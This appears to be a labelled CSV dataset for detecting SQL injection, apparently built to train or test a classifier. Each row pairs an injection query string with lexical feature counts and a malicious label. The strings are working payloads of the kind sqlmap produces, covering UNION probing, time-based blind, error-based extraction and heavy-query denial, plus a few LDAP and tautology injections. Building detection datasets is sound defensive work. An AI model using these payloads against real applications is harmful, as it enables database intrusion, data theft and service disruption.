Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",0,1,11,0,0,10,4,0,0,1,2,10,0,0,0,0,1,59,9,1,1
1'   )    )    order by 1--,1,0,5,0,0,6,2,0,0,1,3,0,0,0,0,0,0,7,2,1,1
1' waitfor delay '0:0:5' and 'vwuz'  =  'vwuz,6,0,8,0,0,8,2,1,0,3,4,0,0,0,0,1,0,23,4,6,1
"1  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",0,0,27,0,0,48,2,7,0,2,13,2,0,0,0,0,0,71,29,0,1
-2806'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'rxzr'  =  'rxzr,4,0,45,0,0,82,4,13,0,4,17,0,0,0,0,0,1,88,50,4,1
1 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,4,0,8,0,0,22,3,2,0,2,7,0,0,0,0,0,1,53,15,4,1
select pg_sleep  (  5  )  --,0,0,4,0,0,6,1,1,0,0,2,0,0,0,0,1,1,13,1,0,1
1 and 1  =  1,0,0,0,0,0,5,1,0,0,2,3,0,0,0,0,0,0,3,3,0,1
-2648'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'sawt'  =  'sawt,4,0,38,0,0,75,3,2,0,3,27,0,0,0,0,0,1,101,48,4,1
select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,0,0,7,0,0,22,2,1,0,0,2,0,0,0,0,0,2,42,20,0,1
"-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",0,0,37,0,0,76,4,14,0,2,15,0,0,0,0,0,2,91,50,0,1
"1""   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",0,1,15,0,0,23,2,3,0,1,5,0,0,0,0,0,1,71,8,1,1
"1  )   union all select null,null,null--",0,0,5,0,0,6,4,0,0,1,3,3,0,0,0,0,1,26,1,0,1
" select * from users where id  =  1 or ""1  )  "" or 1  =  1 -- 1",0,2,5,1,0,18,3,0,0,2,7,0,0,0,1,0,1,26,5,2,1
"1""  )   as bllz where 6975  =  6975 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,1,15,0,0,25,3,2,0,5,10,0,0,0,0,0,0,43,23,3,1
1'  )   as gxfu where 9676  =  9676,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
1'||  (  select 'npdx' from dual where 9486  =  9486 and sleep  (  5   )    )   ||',4,0,8,0,0,17,2,1,0,2,7,0,0,0,0,1,1,31,10,4,1
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,0,23,0,0,43,2,6,0,2,12,1,0,0,0,0,0,63,35,1,1
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,0,35,0,0,72,2,3,0,2,24,0,0,0,0,0,1,75,45,1,1
"-3169"" order by 1#",0,1,2,0,0,4,2,0,0,1,2,0,0,0,0,0,0,7,5,1,1
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",0,0,5,1,0,15,4,1,0,0,6,0,0,0,1,0,2,40,3,0,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'lqsa' like 'lqsa,4,0,8,0,0,17,4,1,0,5,6,0,0,0,0,1,1,35,10,4,1
-8292%'  )   or 8571  =  8571--,1,0,5,0,0,6,1,0,1,1,6,0,0,0,0,0,0,2,12,1,1
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",4,0,34,0,0,55,3,7,0,4,16,2,0,0,0,0,0,82,29,4,1
"1'  )   as rvch where 1863  =  1863 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",3,0,15,0,0,25,3,2,0,4,9,0,0,0,0,0,0,42,23,3,1
"1%""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""%""  =  """,0,4,20,0,0,32,2,0,2,4,14,0,0,0,0,0,0,40,16,4,1
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1,30,0,0,55,2,8,0,3,17,2,0,0,0,0,0,83,35,1,1
"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",1,0,13,0,0,13,4,1,0,1,4,9,0,0,0,0,1,61,9,1,1
; execute immediate 'sel' || 'ect us' || 'er',6,0,7,0,0,9,0,1,0,0,4,0,0,0,0,0,0,26,0,6,1
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,1,0,6,0,0,14,1,2,0,1,4,0,0,0,0,1,0,18,10,1,1
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",2,1,9,1,0,17,5,1,0,1,5,0,0,0,1,0,2,43,3,3,1
1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,0,0,12,0,0,26,3,2,0,1,5,0,0,0,0,1,2,38,10,0,1
select   (  case when   (  1499  =  4923  )   then 1499 else 1/  (  select 0  )   end  )  --,0,0,8,0,0,20,2,1,0,0,4,0,0,0,0,0,2,31,14,0,1
if  (  6745  =  4078  )   select 6745 else drop function ytyt--,0,0,4,0,0,12,1,1,0,0,3,0,0,0,0,0,2,28,12,0,1
"1 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,21,0,0,36,2,5,0,3,12,1,0,0,0,0,0,53,25,0,1
"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",0,1,9,0,0,16,2,1,1,2,6,0,0,0,0,1,1,20,10,1,1
"1""  )   as ymsc where 3694  =  3694 waitfor delay '0:0:5'--",2,1,8,0,0,11,1,2,0,1,4,0,0,0,0,1,0,23,12,3,1
1' or sleep  (  5  ) ,1,0,3,0,0,6,1,1,0,1,1,0,0,0,0,1,0,7,2,1,1
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",0,1,7,0,0,14,2,1,1,1,5,0,0,0,0,1,1,19,10,1,1
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",0,4,22,0,0,35,6,1,0,4,6,0,3,0,0,0,3,58,32,4,1
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",0,4,10,0,0,23,4,1,0,4,5,0,1,0,0,0,1,46,13,4,1
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",4,0,13,0,0,18,3,0,0,5,6,0,0,0,0,0,0,21,13,4,1
-4960'  )   union all select 5300--,1,0,5,0,0,6,4,0,0,1,4,0,0,0,0,0,1,14,8,1,1
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",0,0,10,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,36,0,1
"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",4,0,13,0,0,25,3,0,0,2,7,0,0,0,0,0,2,47,21,4,1
"1%""   )    )    waitfor delay '0:0:5'--",2,1,9,0,0,6,1,1,1,1,4,0,0,0,0,1,0,12,4,3,1
1'  )   as fxid where 5926  =  5926,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',3,0,6,1,0,16,3,0,0,2,8,0,0,0,1,0,1,26,4,5,1
1'+  (  select mavu where 4276  =  4276 rlike sleep  (  5  )  #,1,0,4,0,0,14,2,1,0,1,3,0,0,0,0,1,1,25,10,1,1
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,0,10,0,0,20,3,1,0,1,2,0,0,0,0,1,2,27,2,0,1
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  5215  =  5215",0,0,9,0,0,22,3,0,0,3,6,0,0,0,0,0,1,34,21,0,1
"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,1,8,0,0,14,1,1,0,2,3,0,0,0,0,1,0,11,10,1,1
"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""rtyu"" like ""rtyu",0,4,25,0,0,39,3,2,0,3,4,0,3,0,0,0,1,81,37,4,1
"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",1,0,35,0,0,75,3,1,0,3,25,0,0,0,0,0,1,94,49,1,1
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",0,1,10,0,0,25,2,1,0,1,5,0,1,0,0,0,1,36,21,1,1
1' in boolean mode  )   and 5981  =  6700,1,0,2,0,0,9,2,0,0,3,4,0,0,0,0,0,0,16,9,1,1
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",0,2,5,1,0,18,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,4,0,33,0,0,71,5,1,0,6,28,0,0,0,0,0,1,104,45,4,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",3,0,10,0,0,14,2,0,1,2,4,0,1,0,0,0,1,23,15,3,1
"1""   )    )    as vdbf where 7969  =  7969 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,1,20,0,0,30,2,2,0,1,5,0,3,0,0,0,1,47,43,1,1
"-1084'  )   union all select 2634,2634,2634,2634,2634,2634,2634,2634#",1,0,10,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,36,1,1
"-4462%""  )   or 8571  =  8571--",0,1,5,0,0,6,1,0,1,1,6,0,0,0,0,0,0,2,12,1,1
"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",1,0,9,0,0,7,4,0,1,1,3,0,0,0,0,0,1,14,28,1,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1,0,8,0,0,14,6,0,0,5,8,0,0,0,5,0,1,60,5,1,1
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,0,3,9,0,0,13,2,0,1,2,4,0,1,0,0,0,1,23,15,3,1
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1,0,4,0,0,12,1,1,0,2,6,0,0,0,0,0,0,14,17,1,1
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm",4,0,13,0,0,23,3,3,0,4,7,0,0,0,0,0,1,83,8,4,1
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",0,1,7,0,0,13,3,0,0,1,6,0,0,0,0,0,0,14,24,1,1
-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,4,0,9,0,0,24,3,2,0,1,7,0,0,0,0,0,1,56,18,4,1
"1%"" union all select null,null,null,null,null,null,null--",0,1,9,0,0,5,4,0,1,1,4,7,0,0,0,0,1,42,1,1,1
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",0,1,8,0,0,12,4,1,0,1,2,7,0,0,0,0,1,53,9,1,1
"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",0,3,8,0,0,12,3,1,0,3,3,0,0,0,0,1,1,28,1,3,1
"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",1,0,8,0,0,9,4,0,0,1,5,0,0,0,0,0,1,19,32,1,1
select case when 7634  =  3954 then 1 else null end--,0,0,2,0,0,11,1,1,0,0,3,1,0,0,0,0,1,29,9,0,1
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,24,0,0,39,2,5,0,3,12,1,0,0,0,0,0,53,25,0,1
-3211   )    )    as fsej where 6348  =  6348 or 9805  =  3783--,0,0,5,0,0,13,1,1,0,1,6,0,0,0,0,0,0,13,20,0,1
1'  )   and   (  3020  =  3020  )  *6703,1,0,4,0,0,9,1,0,0,2,4,0,0,0,0,0,0,3,13,1,1
"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",1,0,12,0,0,7,4,0,0,1,4,0,0,0,0,0,1,14,32,1,1
UE1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,2,1,0,1
-8945   )    )    as fszo where 2320  =  2320 union all select 2320--,0,0,5,0,0,13,4,1,0,1,5,0,0,0,0,0,1,25,16,0,1
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",3,0,15,0,0,27,7,3,0,5,11,0,0,0,0,0,2,79,16,3,1
" select * from users where id  =  1 or "",?"" or 1  =  1 -- 1",0,2,6,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,4,0,8,0,0,17,5,1,0,6,8,0,0,0,0,1,1,31,10,4,1
"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ctdc""  =  ""ctdc",0,4,13,0,0,23,7,3,0,7,10,0,0,0,0,0,1,75,8,4,1
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",0,0,19,0,0,37,2,5,0,3,10,1,0,0,0,0,0,57,27,0,1
"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",1,0,8,0,0,12,4,1,0,1,2,7,0,0,0,0,1,53,9,1,1
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",0,2,5,1,0,18,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"-3270%' or elt  (  9404  =  3498,3498  )   and '%'  =  '",4,0,8,0,0,12,2,0,2,3,8,0,0,0,0,0,0,8,16,4,1
-2154%' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and '%'  =  ',4,0,43,0,0,91,4,1,2,3,35,0,0,0,0,0,2,103,54,4,1
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",4,0,26,0,0,32,4,1,0,3,5,0,3,0,0,0,2,44,39,4,1
"1'+  (  select hsef where 4136  =  4136 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",2,0,11,0,0,25,3,0,0,1,6,0,0,0,0,0,2,46,21,2,1
"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1,12,0,0,24,2,4,1,2,7,0,0,0,0,0,1,72,9,1,1
-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,4,0,9,0,0,13,3,0,0,4,6,0,0,0,0,0,0,17,12,4,1
"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,0,4,13,0,0,23,3,3,2,4,9,0,0,0,0,0,1,75,8,4,1
-9087 or 3038  =  3038,0,0,1,0,0,5,1,0,0,1,3,0,0,0,0,0,0,2,12,0,1
1'+  (  select 'ncny' where 5634  =  5634,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""oyuj""  =  ""oyuj",0,4,22,0,0,35,5,1,0,4,7,0,3,0,0,0,3,55,32,4,1
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1,0,10,0,0,5,4,0,1,1,3,0,0,0,0,0,1,14,40,1,1
1'  )   as tqdg where 9355  =  9355,1,0,2,0,0,8,0,1,0,0,1,0,0,0,0,0,0,11,9,1,1
"-2448%""  )   or 3038  =  3038",0,1,3,0,0,6,1,0,1,1,4,0,0,0,0,0,0,2,12,1,1
1'+  (  select 'wsjk' where 3291  =  3291,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,0,4,24,0,0,37,5,1,2,3,8,0,3,0,0,0,3,46,32,4,1
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",0,1,37,0,0,67,2,8,0,1,12,2,0,0,0,0,1,104,35,1,1
1'+  (  select 'fqkk' where 9725  =  9725,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",4,0,14,0,0,24,8,0,0,8,11,0,0,0,5,0,1,73,10,4,1
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'snoa'  =  'snoa,8,0,18,0,0,32,4,2,0,4,10,0,0,0,0,0,1,64,15,8,1
"1""   )    )    as exzo where 7518  =  7518   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",0,1,41,0,0,76,2,9,0,1,15,2,0,0,0,0,1,115,43,1,1
"1""   )    )    as tngu where 3644  =  3644 union all select null--",0,1,5,0,0,13,4,1,0,1,4,1,0,0,0,0,1,29,9,1,1
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,0,4,10,0,0,14,2,1,2,3,6,0,0,0,0,1,0,10,2,4,1
"1'||  (  select 'jpow' from dual where 4381  =  4381 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",4,0,30,0,0,55,13,2,0,7,15,0,2,0,0,0,4,120,43,4,1
"select sleep  (  5  )   and    (    (   ""%""  =  """,0,3,7,0,0,11,2,1,1,2,4,0,0,0,0,1,1,14,1,3,1
1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,0,0,31,0,0,69,2,2,0,2,24,0,0,0,0,0,1,91,45,0,1
"-5202 union all select 5332,5332,5332,5332,5332,5332,5332#",0,0,7,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,32,0,1
1 and 7533  =  7533# absp,0,0,0,0,0,6,1,0,0,2,3,0,0,0,0,0,0,7,9,0,1
"-2857%'   )    )     )   union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,0,12,0,0,8,4,0,1,1,3,0,0,0,0,0,1,14,36,1,1
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar",4,4,14,0,0,28,4,2,0,4,10,0,0,0,0,0,1,64,15,8,1
*  (  |  (  objectclass  =  *   )    ) ,0,0,4,0,0,9,0,1,0,0,4,0,0,0,0,0,0,11,0,0,1
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,0,29,0,0,48,5,2,0,1,7,0,3,0,0,0,4,59,79,1,1
"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",3,0,15,0,0,14,5,0,0,1,7,0,0,0,0,0,2,37,48,3,1
"1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'lshk' like 'lshk",4,0,34,0,0,55,4,7,0,6,17,2,0,0,0,0,0,87,27,4,1
1  )   as qort where 1554  =  1554,0,0,1,0,0,8,1,1,0,1,2,0,0,0,0,0,0,11,9,0,1
"1'||  (  select 'xyft' from dual where 8250  =  8250 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",4,0,14,0,0,29,8,0,0,7,14,0,0,0,5,0,2,86,18,4,1
"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",0,1,9,0,0,17,3,1,0,1,2,0,0,0,0,1,2,27,2,1,1
"-5027%""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,4,4,17,0,0,30,4,2,2,3,12,0,0,0,0,0,1,55,18,8,1
anything' or 'x'  =  'x,4,0,4,0,0,5,3,0,0,3,4,0,0,0,0,0,0,12,0,4,1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,4,0,44,0,0,82,4,13,0,5,17,0,0,0,0,0,1,89,47,4,1
"1' union all select null,null,null,null,null#",1,0,5,0,0,5,4,0,0,1,1,5,0,0,0,0,1,34,1,1,1
"1   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8814  =  8814",0,0,15,0,0,29,7,3,0,7,10,0,0,0,0,0,1,67,16,0,1
"1   )    )    union all select null,null,null,null--",0,0,7,0,0,7,4,0,0,1,3,4,0,0,0,0,1,30,1,0,1
"-8588' union all select 2135,2135--",1,0,5,0,0,5,4,0,0,1,4,0,0,0,0,0,1,14,12,1,1
"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",1,0,11,0,0,7,4,0,0,1,2,0,0,0,0,0,1,14,36,1,1
"1'   )    )    union all select null,null,null,null--",1,0,8,0,0,7,4,0,0,1,3,4,0,0,0,0,1,30,1,1,1
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",3,0,12,0,0,14,5,0,0,1,5,0,0,0,0,0,2,37,44,3,1
